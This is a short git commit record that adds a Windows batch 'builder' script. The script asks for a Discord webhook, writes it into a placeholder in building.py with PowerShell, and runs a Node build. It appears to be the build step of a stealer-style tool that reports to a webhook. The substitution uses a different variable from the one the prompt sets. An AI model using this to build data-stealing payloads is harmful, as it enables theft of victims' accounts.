2849adfa8be285891342ef8bcb28aab3f70e2346
43a1723 <hai1723notgay@gmail.com>
2024-08-03 17:40:06 +0700

    Update and rename vare.bat to builder.bat

---
+++ builder.bat
@@ -0,0 +1,3 @@
+set /p webhook="Enter Webhook Discord: "
+powershell -Command "(Get-Content building.py) -replace 'REPLACE_YOUR_WEBHOOK', '%bottoken%' | Set-Content building.py"
+node build.js varebuilder
